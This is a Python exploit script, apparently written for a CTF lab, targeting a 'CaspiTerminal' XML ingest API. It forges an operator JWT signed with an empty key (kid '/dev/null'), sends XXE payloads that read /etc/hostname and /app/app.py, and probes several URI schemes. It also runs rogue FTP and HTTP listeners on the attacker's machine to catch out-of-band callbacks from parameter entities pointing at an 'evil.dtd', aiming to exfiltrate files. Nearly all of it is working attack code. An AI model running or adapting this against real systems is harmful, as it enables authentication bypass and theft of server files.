#!/usr/bin/env python3
"""round41 — FTP XXE: проверяем поддержку ftp:// в lxml для вытаскивания бинарных файлов"""
import requests, time, json, hmac as hm, hashlib, base64, socket, threading, sys

CASPI = "http://192.168.242.102:8007"
S = requests.Session()

def b64u(d):
    if isinstance(d, str): d = d.encode()
    return base64.urlsafe_b64encode(d).rstrip(b'=').decode()

def jwt_op():
    h = json.dumps({"alg":"HS256","typ":"JWT","kid":"/dev/null"},separators=(',',':')).encode()
    p = json.dumps({"sub":"ctf","company":"X","role":"operator",
        "iat":int(time.time()),"exp":int(time.time())+86400},separators=(',',':')).encode()
    m = b64u(h)+'.'+b64u(p)
    return m+'.'+b64u(hm.new(b'', m.encode(), hashlib.sha256).digest())

AUTH_OP = {"Authorization": f"Bearer {jwt_op()}"}

def xxe_test(entity_url, field="remarks"):
    xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [<!ENTITY x SYSTEM "{entity_url}">]>
<ticket>
  <reference>r</reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>C</carrier>
  <remarks>&x;</remarks>
</ticket>'''
    t0 = time.time()
    try:
        r = S.post(f"{CASPI}/api/ops/custody/ingest",
            data=xml, headers={**AUTH_OP, "Content-Type":"application/xml"}, timeout=20)
        elapsed = time.time() - t0
        if r.status_code == 200:
            try:
                d = r.json()
                val = d.get("summary",{}).get(field,"")
                return r.status_code, val[:500], elapsed
            except:
                return r.status_code, r.text[:200], elapsed
        else:
            return r.status_code, r.text[:200], elapsed
    except Exception as e:
        elapsed = time.time() - t0
        return -1, str(e)[:200], elapsed

# ============================================================
print("="*70)
print("PHASE 1: ОПРЕДЕЛЯЕМ СВОЙ IP НА KALI")
print("="*70)

# Определяем IP Kali на VPN интерфейсе
my_ip = None
try:
    import subprocess
    result = subprocess.run(['ip', '-4', 'addr', 'show'], capture_output=True, text=True)
    lines = result.stdout.split('\n')
    for line in lines:
        line = line.strip()
        if 'inet ' in line and '127.0.0.1' not in line:
            ip = line.split()[1].split('/')[0]
            print(f"  Найден IP: {ip}")
            if ip.startswith('192.168.242'):
                my_ip = ip
                print(f"  >>> VPN IP: {my_ip}")
except:
    pass

if not my_ip:
    print("  VPN IP не найден автоматически")
    print("  Введи свой Kali VPN IP (192.168.242.X):")
    my_ip = input("  > ").strip()

print(f"\n  Используем IP: {my_ip}")

# ============================================================
print("\n"+"="*70)
print("PHASE 2: ТЕСТ ПРОТОКОЛОВ В XXE (file/http/ftp/gopher/data)")
print("="*70)

# Базовый тест — file:// работает (мы знаем)
protocols = [
    ("file:///etc/hostname", "file:// (контроль)"),
    (f"ftp://{my_ip}:2121/test", "ftp:// (наш сервер)"),
    (f"ftp://127.0.0.1:21/test", "ftp:// (localhost)"),
    (f"http://{my_ip}:8888/test", "http:// (наш сервер)"),
    ("gopher://127.0.0.1:9999/_test", "gopher://"),
    ("data:text/plain;base64,dGVzdA==", "data:// (base64)"),
    ("netdoc:///etc/hostname", "netdoc://"),
    ("jar:file:///etc/hostname!/", "jar://"),
]

print("  Тестируем каждый протокол (таймаут 20с)...")
print()
for url, label in protocols:
    code, val, elapsed = xxe_test(url)
    status = "РАБОТАЕТ" if (code == 200 and val) else ("ПУСТО" if code == 200 else f"ОШИБКА({code})")
    print(f"  [{elapsed:5.1f}s] {label:30s} → {status}")
    if val:
        print(f"           Значение: '{val[:100]}'")
    print()

# ============================================================
print("\n"+"="*70)
print("PHASE 3: FTP СЕРВЕР — СЛУШАЕМ ВХОДЯЩИЕ СОЕДИНЕНИЯ")
print("="*70)

# Поднимаем простой FTP-сервер который логирует подключения
# и отдает содержимое запрашиваемых файлов
FTP_PORT = 2121
connections = []

def ftp_handler(conn, addr):
    """Минимальный FTP сервер для OOB XXE"""
    connections.append(addr)
    print(f"  [FTP] ВХОДЯЩЕЕ СОЕДИНЕНИЕ от {addr[0]}:{addr[1]} !!!")
    try:
        conn.settimeout(10)
        conn.sendall(b"220 FTP ready\r\n")

        while True:
            data = conn.recv(1024)
            if not data:
                break
            cmd = data.decode('utf-8', errors='replace').strip()
            print(f"  [FTP] Команда: {cmd}")

            upper = cmd.upper()
            if upper.startswith("USER"):
                conn.sendall(b"331 OK\r\n")
            elif upper.startswith("PASS"):
                conn.sendall(b"230 OK\r\n")
            elif upper.startswith("SYST"):
                conn.sendall(b"215 UNIX\r\n")
            elif upper.startswith("TYPE"):
                conn.sendall(b"200 OK\r\n")
            elif upper.startswith("PWD"):
                conn.sendall(b'257 "/"\r\n')
            elif upper.startswith("CWD"):
                conn.sendall(b"250 OK\r\n")
            elif upper.startswith("EPSV") or upper.startswith("PASV"):
                # Пассивный режим — отдаем порт для данных
                data_port = FTP_PORT + 1
                if upper.startswith("EPSV"):
                    conn.sendall(f"229 Entering Extended Passive Mode (|||{data_port}|)\r\n".encode())
                else:
                    ip_parts = my_ip.replace('.', ',')
                    p1, p2 = data_port // 256, data_port % 256
                    conn.sendall(f"227 Entering Passive Mode ({ip_parts},{p1},{p2})\r\n".encode())
            elif upper.startswith("SIZE"):
                conn.sendall(b"550 Not available\r\n")
            elif upper.startswith("RETR"):
                filename = cmd[5:].strip()
                print(f"  [FTP] RETR запрос: '{filename}'")
                conn.sendall(b"550 File not found\r\n")
            elif upper.startswith("QUIT"):
                conn.sendall(b"221 Bye\r\n")
                break
            else:
                conn.sendall(b"200 OK\r\n")
    except Exception as e:
        print(f"  [FTP] Ошибка: {e}")
    finally:
        conn.close()

# Запускаем FTP сервер в отдельном потоке
ftp_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ftp_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
try:
    ftp_sock.bind(('0.0.0.0', FTP_PORT))
    ftp_sock.listen(5)
    ftp_sock.settimeout(25)
    print(f"  FTP сервер запущен на порту {FTP_PORT}")
    print(f"  Ждем подключения от CaspiTerminal...")

    # Запускаем FTP handler в потоке
    def accept_loop():
        while True:
            try:
                conn, addr = ftp_sock.accept()
                threading.Thread(target=ftp_handler, args=(conn, addr), daemon=True).start()
            except socket.timeout:
                break
            except:
                break

    ftp_thread = threading.Thread(target=accept_loop, daemon=True)
    ftp_thread.start()

    # Отправляем XXE с FTP entity
    print(f"\n  Отправляем XXE с ftp://{my_ip}:{FTP_PORT}/etc/hostname ...")
    code, val, elapsed = xxe_test(f"ftp://{my_ip}:{FTP_PORT}/etc/hostname")
    print(f"  Ответ: [{code}] '{val[:100]}' ({elapsed:.1f}s)")

    # Ждем немного для FTP соединения
    time.sleep(3)

    if connections:
        print(f"\n  ЕСТЬ СОЕДИНЕНИЕ! FTP XXE РАБОТАЕТ!")
        print(f"  Соединений: {len(connections)}")
    else:
        print(f"\n  Нет входящих FTP соединений")

        # Пробуем на другом порту (21 может быть фильтрован)
        print(f"\n  Пробуем другой порт...")

except Exception as e:
    print(f"  Ошибка FTP сервера: {e}")
finally:
    ftp_sock.close()

# ============================================================
print("\n"+"="*70)
print("PHASE 4: HTTP СЕРВЕР — СЛУШАЕМ ВХОДЯЩИЕ СОЕДИНЕНИЯ")
print("="*70)

HTTP_PORT = 8888
http_connections = []

def http_handler(conn, addr):
    http_connections.append(addr)
    print(f"  [HTTP] ВХОДЯЩЕЕ СОЕДИНЕНИЕ от {addr[0]}:{addr[1]} !!!")
    try:
        conn.settimeout(5)
        data = conn.recv(4096)
        print(f"  [HTTP] Запрос: {data[:200]}")
        response = b"HTTP/1.0 200 OK\r\nContent-Type: text/plain\r\n\r\ntest_value"
        conn.sendall(response)
    except:
        pass
    finally:
        conn.close()

http_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
http_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
try:
    http_sock.bind(('0.0.0.0', HTTP_PORT))
    http_sock.listen(5)
    http_sock.settimeout(25)
    print(f"  HTTP сервер запущен на порту {HTTP_PORT}")

    def http_accept():
        while True:
            try:
                conn, addr = http_sock.accept()
                threading.Thread(target=http_handler, args=(conn, addr), daemon=True).start()
            except:
                break

    ht = threading.Thread(target=http_accept, daemon=True)
    ht.start()

    print(f"  Отправляем XXE с http://{my_ip}:{HTTP_PORT}/test ...")
    code, val, elapsed = xxe_test(f"http://{my_ip}:{HTTP_PORT}/test")
    print(f"  Ответ: [{code}] '{val[:100]}' ({elapsed:.1f}s)")

    time.sleep(3)

    if http_connections:
        print(f"\n  ЕСТЬ HTTP СОЕДИНЕНИЕ! HTTP XXE тоже РАБОТАЕТ!")
    else:
        print(f"\n  Нет HTTP соединений (lxml блокирует HTTP как мы и думали)")
except Exception as e:
    print(f"  Ошибка HTTP сервера: {e}")
finally:
    http_sock.close()

# ============================================================
print("\n"+"="*70)
print("PHASE 5: PARAMETER ENTITIES (OOB XXE)")
print("="*70)

# Тест parameter entities — если работают, можно делать OOB XXE
oob_tests = [
    # Простой parameter entity с file://
    (f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [
  <!ENTITY % file SYSTEM "file:///etc/hostname">
  %file;
]>
<ticket>
  <reference>r</reference><tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>C</carrier><remarks>R</remarks>
</ticket>''', "parameter entity + file://"),

    # Parameter entity с FTP DTD
    (f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [
  <!ENTITY % dtd SYSTEM "ftp://{my_ip}:{FTP_PORT}/evil.dtd">
  %dtd;
]>
<ticket>
  <reference>r</reference><tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>C</carrier><remarks>R</remarks>
</ticket>''', "parameter entity + ftp:// DTD"),

    # Parameter entity с HTTP DTD
    (f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [
  <!ENTITY % dtd SYSTEM "http://{my_ip}:{HTTP_PORT}/evil.dtd">
  %dtd;
]>
<ticket>
  <reference>r</reference><tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>C</carrier><remarks>R</remarks>
</ticket>''', "parameter entity + http:// DTD"),
]

# Перезапускаем FTP и HTTP серверы для этого теста
ftp_sock2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ftp_sock2.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
http_sock2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
http_sock2.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

oob_ftp_conn = []
oob_http_conn = []

try:
    ftp_sock2.bind(('0.0.0.0', FTP_PORT))
    ftp_sock2.listen(5)
    ftp_sock2.settimeout(30)
    http_sock2.bind(('0.0.0.0', HTTP_PORT))
    http_sock2.listen(5)
    http_sock2.settimeout(30)

    def oob_ftp_accept():
        while True:
            try:
                conn, addr = ftp_sock2.accept()
                oob_ftp_conn.append(addr)
                print(f"  [OOB-FTP] СОЕДИНЕНИЕ от {addr}!")
                conn.sendall(b"220 ready\r\n")
                time.sleep(2)
                conn.close()
            except:
                break

    def oob_http_accept():
        while True:
            try:
                conn, addr = http_sock2.accept()
                oob_http_conn.append(addr)
                print(f"  [OOB-HTTP] СОЕДИНЕНИЕ от {addr}!")
                data = conn.recv(4096)
                print(f"  [OOB-HTTP] Запрос: {data[:300]}")
                conn.sendall(b"HTTP/1.0 200 OK\r\nContent-Type: text/xml\r\n\r\n<!ENTITY all 'test'>")
                conn.close()
            except:
                break

    threading.Thread(target=oob_ftp_accept, daemon=True).start()
    threading.Thread(target=oob_http_accept, daemon=True).start()

    for xml_payload, label in oob_tests:
        t0 = time.time()
        try:
            r = S.post(f"{CASPI}/api/ops/custody/ingest",
                data=xml_payload,
                headers={**AUTH_OP, "Content-Type":"application/xml"}, timeout=20)
            elapsed = time.time() - t0
            print(f"  [{r.status_code}] {label} ({elapsed:.1f}s): {r.text[:100]}")
        except Exception as e:
            elapsed = time.time() - t0
            print(f"  [ERR] {label} ({elapsed:.1f}s): {e}")
        time.sleep(2)

    time.sleep(3)
    print(f"\n  OOB FTP соединений: {len(oob_ftp_conn)}")
    print(f"  OOB HTTP соединений: {len(oob_http_conn)}")

except Exception as e:
    print(f"  Ошибка: {e}")
finally:
    ftp_sock2.close()
    http_sock2.close()

# ============================================================
print("\n"+"="*70)
print("PHASE 6: ENCODING TRICKS — UTF-16 ENTITY")
print("="*70)

# Попробуем прочитать файл с указанием encoding
# Может обойти ограничение на < и &
encoding_tests = [
    # UTF-16 encoding declaration
    ('''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [
  <!ENTITY x SYSTEM "file:///app/app.py">
]>
<ticket>
  <reference>&x;</reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>C</carrier><remarks>R</remarks>
</ticket>''', "file:// в reference (стандарт)"),

    # Попробуем через CDATA-оборачивание (не должно работать но попробуем)
    ('''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [
  <!ENTITY x "<![CDATA[test]]>">
]>
<ticket>
  <reference>&x;</reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>C</carrier><remarks>R</remarks>
</ticket>''', "CDATA в entity value"),
]

for xml_payload, label in encoding_tests:
    t0 = time.time()
    try:
        r = S.post(f"{CASPI}/api/ops/custody/ingest",
            data=xml_payload,
            headers={**AUTH_OP, "Content-Type":"application/xml"}, timeout=15)
        elapsed = time.time() - t0
        if r.status_code == 200:
            try:
                d = r.json()
                ref = d.get("summary",{}).get("reference","")
                print(f"  [{r.status_code}] {label}: ref='{ref[:200]}' ({elapsed:.1f}s)")
            except:
                print(f"  [{r.status_code}] {label}: {r.text[:100]} ({elapsed:.1f}s)")
        else:
            print(f"  [{r.status_code}] {label}: {r.text[:100]} ({elapsed:.1f}s)")
    except Exception as e:
        print(f"  [ERR] {label}: {e}")

# ============================================================
print("\n"+"="*70)
print("ИТОГИ")
print("="*70)

if connections or oob_ftp_conn:
    print("  FTP XXE РАБОТАЕТ! Можно вытаскивать файлы!")
    print("  Следующий шаг: настроить FTP сервер для OOB экстракции")
elif http_connections or oob_http_conn:
    print("  HTTP XXE РАБОТАЕТ (внешний)! Можно делать OOB!")
else:
    print("  Ни FTP ни HTTP XXE не дали входящих соединений")
    print("  Возможные причины:")
    print("    - Docker контейнер не может выйти в VPN сеть")
    print("    - lxml блокирует все внешние протоколы")
    print("    - Файрвол блокирует исходящие соединения")

print("\n"+"="*70)
print("DONE")
print("="*70)
